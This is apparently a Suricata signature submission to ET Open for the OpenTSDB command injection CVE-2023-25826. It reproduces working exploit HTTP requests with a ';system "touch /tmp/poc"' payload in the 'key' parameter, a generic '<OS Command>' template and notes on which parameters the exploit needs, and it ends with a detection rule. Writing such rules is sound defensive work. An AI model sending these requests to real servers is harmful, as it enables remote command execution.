# ET Open Submission
### May 6th, 2024
### OpenTSDB arbitrary commands injection（CVE-2023-25826）


## Resources

1. [https://www.synopsys.com/blogs/software-security/opentsdb.html](https://www.synopsys.com/blogs/software-security/opentsdb.html)
2. [https://github.com/vulhub/vulhub/tree/master/opentsdb/CVE-2023-25826#opentsdb-arbitrary-commands-injectioncve-2023-25826](https://github.com/vulhub/vulhub/tree/master/opentsdb/CVE-2023-25826#opentsdb-arbitrary-commands-injectioncve-2023-25826)

### The exploit:

There must be at least one metric existing on the server for RCE. You can create your own metric as well.

Request sent to create a metric called `sys.cpu.nice`
```
POST /api/put/ HTTP/1.1
Host: your-ip:4242
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Length: 150

{
    "metric": "sys.cpu.nice",
    "timestamp": 1346846400,
    "value": 20,
    "tags": {
       "host": "web01",
       "dc": "lga"
    }
}
```

The exploit is ran against the `key` parameter.
```
GET /q?start=2000/10/21-00:00:00&m=sum:sys.cpu.nice&o=&ylabel=1&xrange=&y2range=[42:42]&key=%3Bsystem%20%22touch%20/tmp/poc%22%20%22&wxh=1516x644&style=linespoint&baba=lala&grid=t&json HTTP/1.1
Host: your-ip:4242
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close
```

The most important part of this is happening in the http.uri.

`/q?start=2000/10/21-00:00:00&m=sum:sys.cpu.nice&o=&ylabel=1&xrange=&y2range=[42:42]&key=%3Bsystem%20%22touch%20/tmp/poc%22%20%22&wxh=1516x644&style=linespoint&baba=lala&grid=t&json`

After some testing with the code, I have found that every parameter is required but it doesn't seem to matter what some of the contents are.

Findings on each parameter:

- start just needs to exist with a number.
- xrange can be empty or non existant
- The smallest the WXH can be is 100x100 and the largest it can be is 32767x32767
- "style" must satisfy the pattern (linespoint|points|circles|dots)
- baba doesn't seem to need to exist.
- json needs to be there.

Example of a modified and working URI.

`/q?start=5&ylabel=1&y2range=[00:00]&style=linespoint&key=%3Bsystem "touch /tmp/poc1" "&wxh=32767x100&grid=2&json&m=sum:sys.cpu.nice`

I think the meat of this sig might fall in the `key=%3Bsystem%20%22<OS Command>%22%20%22` or `key=;system "<OS Command>" "`

Now I swear there is a blog somewhere about catching generic bash commands for PCRE in a sig but I, for the life of me, have no clue where it is now. I would run it for the `key=;system "<OS Command>" "` 

## Signature

```alert http $EXTERNAL_NET any -> $HOME_NET any (msg:"OpenTSDB arbitrary commands injection (CVE-2023-25826)"; flow:established,to_server; http.method; content:"GET"; bsize:3; http.uri; content:"|2f|q|3f|"; startswith; content:"key|3d 3b|system|20 22|"; fast_pattern; content:"|22 20 22|"; distance:3; within:500; content:"m|3d|sum|3a|"; content:"ylabel=";  pcre:"/style|3d|(linespoint|points|circles|dots)/R"; content:"start|3d|"; pcre:"/y2range|3d|\[[0-9]{1,2}:[0-9]{1,2}\]/Ri"; sid:1; rev:1; metadata:attack_target Server, created_at 2024_05_06, deployment Perimeter, deployment Internal, former_category EXPLOIT, signature_severity Major, tag Exploit, updated_at 2024_05_06;)```

[Job Zip](https://github.com/eatinsundip/Suricata/files/15190887/9dfa93c65d3bbd7d.zip) Fix and then ready to send!

[https://dalton.securitymidwest.net/dalton/job/18e7f569a8f358f4](https://dalton.securitymidwest.net/dalton/job/18e7f569a8f358f4)


## NOTES


